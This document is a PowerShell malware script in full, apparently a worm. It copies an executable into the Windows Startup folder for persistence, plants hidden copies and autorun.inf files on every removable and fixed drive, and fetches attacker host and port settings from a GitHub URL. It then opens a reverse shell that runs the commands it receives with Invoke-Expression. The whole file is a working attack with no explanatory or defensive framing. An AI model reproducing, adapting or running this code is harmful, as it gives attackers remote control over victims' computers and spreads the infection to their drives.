$fileName = "app.exe"
$startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"

if ($PWD.Path -ne $startupFolder) {
    $sourcePath = Join-Path -Path $PWD.Path -ChildPath $fileName
    $destinationPath = Join-Path -Path $startupFolder -ChildPath $fileName

    Copy-Item -Path $sourcePath -Destination $destinationPath -Force
}

$currentPath = (Get-Location).Path
$currentDriveRoot = "$((Get-Location).Drive.Name):\"
$isAtRoot = ($currentPath -eq $currentDriveRoot)

$autorunContent = @"
[autorun]
open=app.exe
action=Start App
shell\open\command=app.exe
icon=app.exe,0
label=App
"@

$usedDrives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 -or $_.DriveType -eq 3 } | Select-Object -ExpandProperty DeviceID

foreach ($driveId in $usedDrives) {
    $targetDriveRoot = "$driveId\"
    
    if ($isAtRoot -and ($targetDriveRoot -eq $currentDriveRoot)) { continue }

    try {
        Copy-Item -Path "app.exe" -Destination "$($targetDriveRoot)app.exe" -Force -ErrorAction Stop
        
        $autorunPath = "$($targetDriveRoot)autorun.inf"
        $autorunContent | Set-Content -Path $autorunPath -Encoding ASCII -Force
        
        (Get-Item "$($targetDriveRoot)app.exe").Attributes = 'Hidden', 'System'
        (Get-Item $autorunPath).Attributes = 'Hidden', 'System'        
    }
    catch {
        Write-Warning "Skipped $targetDriveRoot : $($_.Exception.Message)"
    }
}

$url = "https://raw.githubusercontent.com/WaxArsatia/Random/refs/heads/main/virus/lhostlport.txt"
$configText = Invoke-RestMethod -Uri $url

$configMap = ConvertFrom-StringData -StringData $configText

$LHOST = $configMap.LHOST
$LPORT = [int]$configMap.LPORT

$TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
